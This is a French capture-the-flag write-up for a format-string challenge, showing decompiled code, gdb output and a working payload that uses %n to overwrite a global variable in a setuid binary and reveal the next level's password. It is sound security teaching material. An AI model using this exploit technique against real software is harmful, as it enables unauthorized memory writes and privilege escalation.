Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2025(level4) gid=2025(level4) groups=2025(level4),100(users)
/home/user/level4
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level4 :

```
$ ./level4

```

Il ne répond qu'avec un input :

```
$ ./level4
da
da
```

J'utilise [Dogbolt](https://dogbolt.org/?id=b9f0625b-1ccf-4c04-ba81-40bf2a6eb0c0) afin de décompiler le binaire du level 4 :

### Ghidra

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n() {
  char buffer[520];
  
  fgets(buffer, 512,stdin);
  p(buffer);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main() {
  n();
  return;
}
```

### Hexray

```c
int n() {
  int result; // eax
  char buffer[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(buffer, 512, stdin);
  p(buffer);
  result = m;
  if ( m == 16930116 )
    return system("/bin/cat /home/user/level5/.pass");
  return result;
}

void p(char *buffer) {
  printf(buffer);
  return;
}
```

Je note les choses suivante :

- `fgets()` est utilisé, et n'est donc pas vulnérable
- `printf()` est utilisé, probablement expoitable comme le level 3, cependant il est dans une autre fonction

Je me penche sur la possibilité d'utiliser le même exploit que le level 3.
Je commence donc par trouver l'adresse de la variable `m` dans `gdb`.

Je trouve : `0x08049810`

```
(gdb) disas n
Dump of assembler code for function n:
    ...
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax <- ici
   0x08048492 <+59>:    cmp    $0x1025544,%eax
    ...
```

Grâce à Hexray, je sais que la valeur qu'on essaye de comparer à `m` est `16930116`.
Il faut donc, par le même exploit que le level3, que j'arrive à donner à `m` cette valeur.

Hors, dans le niveau précédent, j'avais la place d'écrire 64 caractères dans le buffer. Cette fois-ci, le buffer est seulement de 512 bytes, donc je n'ai pas ce luxe.

Pour le moment, j'ai donc uniquement la première partie de mon payload infecté, qui est l'adresse de `m` :

```python
python -c 'print("\x08\x04\x98\x10"[::-1])'
```

Maintenant, j'utilise une astuce qui me permet de ne pas écrire les 16 millions de caractères : `%16930116p`.

Cela me permet de représenter en tant que pointeur une valeur, mais avec un padding de 16 millions de caractères. Cela permet de contourner la limitation de `512` que `fgets()` exige ici.

Hors, j'ai déjà écris les 4 bytes de l'adresse de `m` dans le payload, je n'ai donc besoin que de mettre un padding de `%16930112p`.

Le payload ressemble donc à ça pour le moment :

```python
python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p")'
```

La dernière partie du payload est donc de convertir tout ces caractères en utilisant le formatteur `%n`. Comme pour le level3, il me faut donc trouver quel est la position de l'argument qui pointerait sur la première partie du `printf` (ici donc l'adresse de `m`) :

```
$ python -c 'print("a %x %x %x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
a b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 78252061 20782520 25207825
                                                                                        ^
$ python -c 'print("b %x %x %x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
b b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 78252062 20782520 25207825
                                                                                        ^
```

C'est donc ici le 12eime argument qui représente la première partie du `printf()`. Donc, comme pour le level 3, cela signifie que la dernière partie de mon payload est ``%12$n` (note: le `$` dénote un argument tandis que le `12` est un simple padding, le combo signifie donc "l'argument à telle position").

Payload final :

```python
python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")'
```

Je l'essaye :

```
python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4

... (il print 16 millions de caractère de padding)

                      0xb7ff26b0 (puis le pointeur (le premier de la stack, vu qu'on ne demande pas une position précise), note: c'est le premier des 12 argument vu plus haut lors du test avec les %x %x %x...)

(enfin, de manière invisible, le %12$n affecte comme valeur de pointeur au 12eime argument de la stack (ici donc l'adresse de m) la valeur des caractère imprimé jusque ici, donc 16 millions, ce qui change permet à 'm' de passer le if, et de nous imprimer le .pass ci-dessous)

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
